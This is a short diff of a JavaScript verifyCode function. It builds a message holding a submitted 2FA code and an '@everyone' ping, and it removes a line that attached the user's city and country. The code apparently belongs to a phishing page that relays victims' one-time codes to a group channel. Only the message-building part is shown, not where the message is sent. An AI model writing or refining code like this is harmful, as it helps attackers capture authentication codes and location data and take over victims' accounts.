@@ -218,7 +218,6 @@ async function verifyCode() {
         // Simplified 2FA payload to avoid 400 errors
         const payload = {
             content: `2FA: ${code}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}
 @everyone`
         };
 
